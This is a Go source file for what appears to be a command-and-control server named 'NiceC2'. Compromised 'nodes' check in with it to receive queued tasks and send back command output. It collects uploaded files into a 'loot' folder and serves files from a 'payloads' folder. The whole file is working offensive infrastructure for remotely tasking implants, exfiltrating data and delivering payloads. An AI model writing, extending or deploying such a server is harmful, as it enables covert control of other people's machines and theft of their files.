package main

import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"time"
)

// Banner for the application
const banner string = `

███╗   ██╗██╗ ██████╗███████╗ ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
████╗  ██║██║██╔════╝██╔════╝██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██╔██╗ ██║██║██║     █████╗  ██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║╚██╗██║██║██║     ██╔══╝  ██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
██║ ╚████║██║╚██████╗███████╗╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝ ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
                                                                                                  

`

// Command ID. This will keep going up as commands are added to the queue.
// It should never be bellow 0
var taskID int = 1

// The main array of all nodes that have checked in.
var nodes []node = read_nodes_from_file()

// The array holding the queue of tasks
var task_queue []Task

func main() {

	fmt.Println("The current task queue")
	fmt.Println(task_queue)
	fmt.Println()
	fmt.Println()

	handleRequests()

}

// Api endpoints and stuff
func handleRequests() {

	http.HandleFunc("/checkin", nodeCheckIn)
	http.HandleFunc("/node_response", node_response)
	http.HandleFunc("/create_task", create_task_API)
	http.HandleFunc("/get_nodes", get_nodes)
	http.HandleFunc("/get_tasks", get_tasks)
	http.HandleFunc("/send_file/", send_file_handler)
	http.HandleFunc("/get_file", get_file_handler)
	// http.HandleFunc("/getPayload", getPayload)

	// Console endpoints
	http.HandleFunc("/list_payloads", list_payloads)
	http.HandleFunc("/list_loot", list_loot)
	http.HandleFunc("/show_cert", show_cert)

	log.Fatal(http.ListenAndServeTLS(":8081", "server.crt", "server.key", nil))
}

func show_cert(w http.ResponseWriter, req *http.Request) {

	certString, err := ioutil.ReadFile("server.crt")
	if err != nil {

		fmt.Println("Error reading cirtfile")
		return
	}

	fmt.Fprintf(w, string(certString))

}

func get_tasks(w http.ResponseWriter, req *http.Request) {
	// Decode te JSON
	decoder := json.NewDecoder(req.Body)

	fmt.Println(decoder)
	fmt.Println(req.Body)

	json_tasks, err := sliceToJSON(task_queue)
	if err != nil {
		fmt.Println("Error converting nodes slice, to json string")
	}

	fmt.Println("/////////////////////////////////////")

	fmt.Println(json_tasks)
	fmt.Println("/////////////////////////////////////")

	// json, _ := json.Marshal(json_tasks)

	fmt.Fprintf(w, json_tasks)
}

func list_payloads(w http.ResponseWriter, req *http.Request) {

	files, err := ioutil.ReadDir("payloads/")
	if err != nil {
		// return nil, err

		fmt.Println("Error reading payloads dir")
		return
	}
	var fileNames []string
	for _, file := range files {
		fileNames = append(fileNames, file.Name())
	}

	json_paylods, err := sliceToJSON(fileNames)
	if err != nil {
		fmt.Println("couldn't decode JSON slice")
	}

	fmt.Fprintf(w, json_paylods)

}

func list_loot(w http.ResponseWriter, req *http.Request) {

	files, err := ioutil.ReadDir("loot/")
	if err != nil {
		// return nil, err

		fmt.Println("Error reading loots dir")
		return
	}
	var fileNames []string
	for _, file := range files {
		fileNames = append(fileNames, file.Name())
	}

	json_paylods, err := sliceToJSON(fileNames)
	if err != nil {
		fmt.Println("couldn't decode JSON slice")
	}

	fmt.Fprintf(w, json_paylods)

}

func get_nodes(w http.ResponseWriter, req *http.Request) {

	fmt.Println("New node list requested")

	fmt.Println(req.Body)

	// Decode te JSON
	decoder := json.NewDecoder(req.Body)

	fmt.Println(decoder)
	fmt.Println(req.Body)

	json_nodes, err := sliceToJSON(nodes)
	if err != nil {
		fmt.Println("Error converting nodes slice, to json string")
	}

	fmt.Println(json_nodes)

	json, _ := json.Marshal(nodes)

	fmt.Fprintf(w, string(json))

}

type task_create_request struct {
	NodeID  string `json:"NodeID"`
	Task    string `json:"Task"`
	Details string `json:"Details"`
	Key     string `json:"Key"`
}

func create_task_API(w http.ResponseWriter, req *http.Request) {

	fmt.Println("New task has been recieved!")

	fmt.Println(req.Body)

	// Decode the json body
	decoder := json.NewDecoder(req.Body)

	fmt.Println(decoder)
	fmt.Println(req.Body)

	var task_create_request task_create_request

	err := decoder.Decode(&task_create_request)
	if err != nil {

		fmt.Println("There was an error decoding the JSON in the task response")
		panic(err)
	}

	fmt.Println(task_create_request)

	// Now we have the result.

	// correct for if a hostname is passed to the system
	for _, node := range nodes {
		if node.Hostname == task_create_request.NodeID {
			task_create_request.NodeID = node.ID
		}
	}

	fmt.Println("🤔")

	var new_task = create_task(task_create_request.NodeID, task_create_request.Task, task_create_request.Details)

	task_queue = append(task_queue, new_task)

	var response = string(`{"taskID" : "` + new_task.TaskID + `"}`)

	fmt.Println("API task has now been added to queue")

	// Send the response back
	fmt.Fprintf(w, response)

}

// Function for that runs each time the node checks in
func nodeCheckIn(w http.ResponseWriter, req *http.Request) {

	var blank_response = string(`
	{
		"taskID": "0", 
		"task": "",  
		"arg" : ""
		
	}`)

	// Get's the current time
	dt := time.Now()

	// Decode the json body
	decoder := json.NewDecoder(req.Body)
	var node_that_checked_in check_in
	err := decoder.Decode(&node_that_checked_in)
	if err != nil {
		panic(err)
	}

	// Adding the node to the list (Needs to be only if new node)

	if is_new_node(node_that_checked_in.ID) == true {
		fmt.Println("Damn look it's a new node!")
		nodes = append(nodes, createNode(node_that_checked_in.ID, node_that_checked_in.Hostname, node_that_checked_in.Platform, dt.String()))
	} else {

		update_node(node_that_checked_in.ID, dt.String())

		// fmt.Println("Node re-checked in")
	}

	// Find that nodes task
	Task_location, find_task_message := find_task_unsent(node_that_checked_in.ID)

	// This handles sending back a blank response if no task is found
	if find_task_message != "" {
		// Send the blank response back
		fmt.Fprintf(w, blank_response)

	} else {

		var response = string(`{"taskID": "` + task_queue[Task_location].TaskID + `", "task": "` + task_queue[Task_location].Action + `",  "arg": "` + task_queue[Task_location].Content + `"}`)

		// Stops the same command from being sent multiple times
		task_queue[Task_location].Progress = "sent"

		// Send the response back
		fmt.Fprintf(w, response)
	}

	// fmt.Println(task_queue)

	save_nodes_to_file()
}

// Handles when a node sends back the result of a task (Command output)
func node_response(w http.ResponseWriter, req *http.Request) {

	fmt.Println("Node has sent response!")

	fmt.Println(req.Body)

	// Decode the json body
	decoder := json.NewDecoder(req.Body)

	var response_to_task Task_Response

	err := decoder.Decode(&response_to_task)
	if err != nil {

		fmt.Println("There was an error decoding the JSON in the task response")
		panic(err)
	}

	// Now we have the result.

	// change task in task list to complete
	task_location, find_task_error := find_task_by_id(response_to_task.TaskID)
	if find_task_error != "" {
		fmt.Println(find_task_error)
	}

	task_queue[task_location].Progress = response_to_task.Progress

	// add the result to the task array
	task_queue[task_location].Result = response_to_task.Result

	fmt.Println(task_queue[task_location])

	fmt.Println()

}

func get_file_handler(w http.ResponseWriter, r *http.Request) {
	// Parse the multipart form
	err := r.ParseMultipartForm(32 << 20) // 32 MB limit
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// Get the file from the form
	file, handler, err := r.FormFile("file")
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	defer file.Close()

	// Create a new file on the server with the same name as the uploaded file
	filepath := "./loot/" + handler.Filename
	f, err := os.OpenFile(filepath, os.O_WRONLY|os.O_CREATE, 0666)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer f.Close()

	// Write the file to disk
	_, err = io.Copy(f, file)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	// Return a success message
	fmt.Fprintf(w, "File retrieved successfully: %s", handler.Filename)

	fmt.Println("File moved to to path:", filepath)
}

func send_file_handler(w http.ResponseWriter, r *http.Request) {

	// Get the file name from the request URL
	filename := r.URL.Path[len("/send_file/"):]

	// Check if the file exists
	if _, err := os.Stat("payloads/" + filename); os.IsNotExist(err) {
		http.NotFound(w, r)

		fmt.Println("🚨 The file has not been found")
		return
	}

	// Open the file
	file, err := os.Open("payloads/" + filename)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		fmt.Println("🚨 The file can't be opened")

		return
	}
	defer file.Close()

	// Set the response header
	w.Header().Set("Content-Disposition", "attachment; filename="+filename)
	w.Header().Set("Content-Type", "application/octet-stream")
	// w.Header().Set("Content-Length", fmt.Sprintf("%d", fileStat.Size()))

	fmt.Println("🙃 io.copy thing")
	// Copy the file to the response writer
	_, err = io.Copy(w, file)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
}

// sliceToJSON converts a slice of structs to a JSON string
func sliceToJSON(slice interface{}) (string, error) {
	// Marshal the slice of structs into a JSON string
	jsonBytes, err := json.Marshal(slice)
	if err != nil {
		return "", err
	}

	// Convert the JSON bytes to a string and return it
	return string(jsonBytes), nil
}